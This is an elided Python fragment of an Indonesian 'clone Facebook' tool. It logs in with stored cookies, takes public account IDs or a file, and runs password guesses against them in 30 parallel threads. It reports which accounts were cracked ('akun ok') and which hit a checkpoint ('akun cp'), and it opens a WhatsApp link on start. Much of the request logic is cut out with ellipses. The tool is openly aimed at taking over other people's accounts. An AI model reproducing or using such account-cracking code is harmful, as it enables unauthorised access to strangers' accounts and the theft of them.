...
def banner():
	os.system('clear')
	baz_bann(f'''{biru}   mmmm    mmm  mmmmmm mmmmm
 #"   " m"   " #      #    #
 "#mmm  #      #mmmmm #mmmm"
     "# #      #      #    #
 "mmm#"  "mmm" #      #mmmm"
[SIMPLE CLONE FACEBOOK]
github: http://github.com/RECS-XD ''')
...
def login_baz():
	try:
		...
		try:
			...
			baz_anim(f'└──{mer} cek koneksi internetmu :(')
			exit()
	except IOError:
		login_men()
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n└── \x1b[1;92valid.your cookies next run");exit()
			except Exception as e:
				print("\x1b[1;92m[×\x1b[1;92m]\033[93m └──\x1b[1;92minvalid your cookies")
...
def menu(id):
	try:
		...
		login_men()
	os.system('clear')
	os.system('xdg-open https://wa.me/+6281381401262')
	waktu(1)
	banner()
	print(f'{xxx}─────────────────────────────')
	print(f'{xxx}└── CLONE FROM :public/file?1')
	helpbas = input(f'{xxx}└── : ')
	if helpbas in ['publik','Publik','public']:
		...
		baz_anim(f'{puti}└──{mer} ketik yang benar asyhu')
		baz_anim(f'{puti}└──{bira} input publik atau file')
		...
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				...
				if 'metod1' in baz:
					...
					gas_krek.submit(metod3,idf,pwv)
		print(f'{xxx}─────────────────────────────')
		print(f'{biru}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{mer}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
		print(f'{xxx}─────────────────────────────')
